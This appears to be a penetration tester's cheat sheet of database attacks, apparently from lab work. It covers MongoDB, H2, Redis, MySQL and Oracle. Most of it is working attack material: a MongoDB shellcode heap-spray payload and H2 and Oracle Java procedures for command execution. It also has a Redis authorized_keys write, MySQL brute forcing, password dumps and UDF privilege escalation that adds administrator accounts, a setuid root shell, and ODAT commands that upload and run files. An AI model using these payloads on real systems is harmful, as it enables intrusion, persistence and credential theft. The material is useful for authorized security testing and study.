## Tools 

- NoSQLMap - <https://github.com/codingo/NoSQLMap>
- SQLMap - <http://sqlmap.org/>

## MongoDB

- Connect: `mongo -p -u $USER $DB_NAME`
- RCE: <https://cxsecurity.com/issue/WLB-2013030212>
    ```javascript
    db.my_collection.find({'$where':'shellcode=unescape("METASPLOIT JS GENERATED SHELLCODE"); sizechunk=0x1000; chunk=""; for(i=0;i<sizechunk;i++){ chunk+=unescape("%u9090%u9090"); } chunk=chunk.substring(0,(sizechunk-shellcode.length)); testarray=new Array(); for(i=0;i<25000;i++){ testarray[i]=chunk+shellcode; } ropchain=unescape("%uf768%u0816%u0c0c%u0c0c%u0000%u0c0c%u1000%u0000%u0007%u0000%u0031%u0000%uffff%uffff%u0000%u0000"); sizechunk2=0x1000; chunk2=""; for(i=0;i<sizechunk2;i++){ chunk2+=unescape("%u5a70%u0805"); } chunk2=chunk2.substring(0,(sizechunk2-ropchain.length)); testarray2=new Array(); for(i=0;i<25000;i++){ testarray2[i]=chunk2+ropchain; } nativeHelper.apply({"x" : 0x836e204}, ["A"+"\x26\x18\x35\x08"+"MongoSploit!"+"\x58\x71\x45\x08"+"sthack is a nice place to be"+"\x6c\x5a\x05\x08"+"\x20\x20\x20\x20"+"\x58\x71\x45\x08"]);'})
    ```
- References:
    - <https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html>

## Microsoft Access

- MDB Tools - Read Access databases on \*nix: <https://github.com/brianb/mdbtools>
    ```bash
    mdb-tables backup.mdb | grep --color=auto user
    mdb-export backup.mdb tableName
    ```

## H2 

- RCE:
    ```sql
    CREATE​ ​ALIAS​ SHELLEXEC ​AS​ $$ ​String​ shellexec(​String​ cmd) throws java.io.IOException { java.util.Scanner s = ​new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelim iter(​"\\A"​); return s.hasNext() ? s.next() : ""; }$$;
    CALL​ SHELLEXEC(​'id'​)
    ```

## Redis 

- Redis-tools: `sudo apt-get install redis-tools`
- <http://antirez.com/news/96>
- Connect and basic query:
    ```bash
    redis-cli -h 10.10.10.160
    10.10.10.160:6379> dbsize
    (integer) 0
    (0.51s)
    10.10.10.160:6379> CONFIG GET databases
    1) "databases"
    2) "16"
    (0.63s)
    10.10.10.160:6379> INFO keyspace
    # Keyspace
    (0.56s)
    10.10.10.160:6379> INFO
    ```
- Write to authorized_keys file:
    ```bash
    ssh-keygen -f redis
    echo -ne "\n\n" > public; cat redis.pub >> public

    redis-cli -h 10.10.10.160 SLAVEOF NO ONE
    
    cat public | redis-cli -h 10.10.10.160 -x set pub
    
    redis-cli -h 10.10.10.160 CONFIG SET dir /var/lib/redis/.ssh
    redis-cli -h 10.10.10.160 CONFIG SET dbfilename authorized_keys
    redis-cli -h 10.10.10.160 SAVE
    ```

## Sqlte

Dump entire database:
```bash
sqlite3 some.db .schema > schema.sql
sqlite3 some.db .dump > dump.sql
grep -vx -f schema.sql dump.sql > data.sql
```

Dump into CSV
```sql
.mode csv
-- use '.separator SOME_STRING' for something other than a comma.
.headers on
.out file.csv
select * from MyTable;
```

Insert into SQL:
```sql
.mode insert <target_table_name>
.out file.sql
select * from MyTable;
```

## MySQL

- Bruteforce: `hydra -l root -P /path/to/wordlist.txt (TARGET IP ADDRESS) mysql`
- Connection tests
    ```
    mysql -h <Hostname> -u root
    mysql -h <Hostname> -u root
    mysql -h <Hostname> -u root@localhost
    mysql -h <Hostname>
    mysql -h <Hostname> -u ""@localhost

    mysql -u john -phiroshima -e 'show databases'
    mysql -u john -phiroshima -D webapp -e 'show tables'
    ```
- Configuration files:
  - Windows
    - config.ini
    - my.ini
    - windows\my.ini
    - winnt\my.ini
    - <InstDir>/mysql/data/
  - UNIX
    - /etc/my.cnf
    - /etc/mysql/my.cnf
    - /var/lib/mysql/my.cnf
    - ~/.my.cnf
    - /etc/my.cnf
- Command history:
  - ~/.mysql.history
- Log files:
  - connections.log
  - update.log
  - common.log

### Privilege Escalation

Current access level:
```
mysql>select user();
mysql>select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='OUTPUT OF select user()';
```

Access passwords:
```
mysql> use mysql
mysql> select user,password from user;
```

Create new user and grant permissions:
```
mysql> create user test identified by 'test';
mysql> grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;
```

Break into shell:
```
mysql> \! cat /etc/passwd
mysql> \! bash
```

### MySQL root to system root

- [MySQL Root to System Root with lib_mysqludf_sys for Windows and Linux](https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/)

Take lib from SQLMap and dump it into the server:

```
udf/mysql/linux/32/lib_mysqludf_sys.so
udf/mysql/linux/64/lib_mysqludf_sys.so
udf/mysql/windows/32/lib_mysqludf_sys.dll
udf/mysql/windows/64/lib_mysqludf_sys.dll
```

On Windows:

```sql
USE mysql;
CREATE TABLE npn(line blob);
INSERT INTO npn values(load_file('C://xampplite//htdocs//mail//lib_mysqludf_sys.dll'));
SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
SELECT sys_exec("net user npn npn12345678 /add");
SELECT sys_exec("net localgroup Administrators npn /add");
```

On Linux:

```sql
use mysql;
create table npn(line blob);
insert into npn values(load_file('/home/npn/lib_mysqludf_sys.so'));
select * from npn into dumpfile '/usr/lib/lib_mysqludf_sys.so';
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
select sys_exec('id > /tmp/out; chown npn.npn /tmp/out');

npn@pwn:~$ cat /tmp/out
  uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)

// Create a shell, compile it, "chmod +s /tmp/shell" and get reverse shell
```

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
    setuid(0); setgid(0); system(“/bin/bash”);
}

```

```bash
gcc -o /tmp/shell /home/npn/shell.c
chmod +s /tmp/shell
```

## Oracle 

### RCE 

Add permissions (sqlPlus required): 
```sql
DECLARE
  l_schema VARCHAR2(30) := 'SYSTEM';
BEGIN
  DBMS_JAVA.grant_permission(l_schema, 'java.io.FilePermission', '<<ALL FILES>>', 'read ,write, execute, delete');
  DBMS_JAVA.grant_permission(l_schema, 'SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
  DBMS_JAVA.grant_permission(l_schema, 'SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');
END;
/
```

Java code:
```sql
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "pwn" AS
import java.lang.*;
import java.io.*;
 
public class pwn
{
 public static void cmd (String command) throws IOException
 {
     Runtime.getRuntime().exec(command);
 }
};
/
```

Create procedure:
```sql
CREATE OR REPLACE PROCEDURE pwn_cmd (p_command IN VARCHAR2)
AS LANGUAGE JAVA
NAME 'pwn.cmd (java.lang.String)';
/

```

Run command:
```sql
exec pwn_cmd('net user trevelyn trevelyn /add');
exec pwn_cmd('net localgroup Administrators trevelyn /add');
exec pwn_cmd('cmd.exe /c echo open X.X.X.X > C:\ftp.txt'); 
```

### Tools

- Oracle Database Attack Tool (ODAT) <https://github.com/quentinhardy/odat>
    ```
    All checks:
    ./odat.py all -s 10.10.10.82 -p 1521
    ./odat.py all -s 10.10.10.82 -d XE -U scott -P tiger


    Gusss SID: 
    ./odat.py sidguesser -s 10.10.10.82

    Guess passwords:
    ./odat.py passwordguesser -d XE -s 10.10.10.82 -p 1521 --accounts-file /root/HTB/tools/db/odat/accounts/accounts.txt

    Guess login: 
    use admin/oracle/oracle_login

    Upload file:
    ./odat.py utlfile -d XE -s 10.10.10.82 -p 1521 -U scott -P tiger --sysdba --putFile c:/ writeup.exe ~/HTB/silo/writeup.exe
    ./odat.py dbmsxslprocessor -d XE -s 10.10.10.82 -p 1521 -U scott -P tiger --putFile "c:\\inetpub\\wwwroot" "File-Test.txt" "/tmp/File-Test.txt"

    Execute file:
    ./odat.py externaltable -d XE -s 10.10.10.82 -p 1521 -U scott -P tiger --sysdba --exec c:/ writeup.exe
    ```
- Nmap
    ```
    nmap --script oracle-sid-brute (TARGET IP ADDRESS) -p 1521
    ```
- oscanner
    ```
    oscanner -s (TARGET IP ADDRESS)
    ```

### Queries 

- Get all usernames and password: `SELECT Username || ':' || PASSWORD AS credentials FROM DBA_USERS;`
- DB Version: `SELECT * FROM V$VERSION`
- List all tables owned by user: `SELECT table_name FROM user_tables;`
- Get current DB user: `SELECT NAME FROM v$database;`

### References

- <https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573>
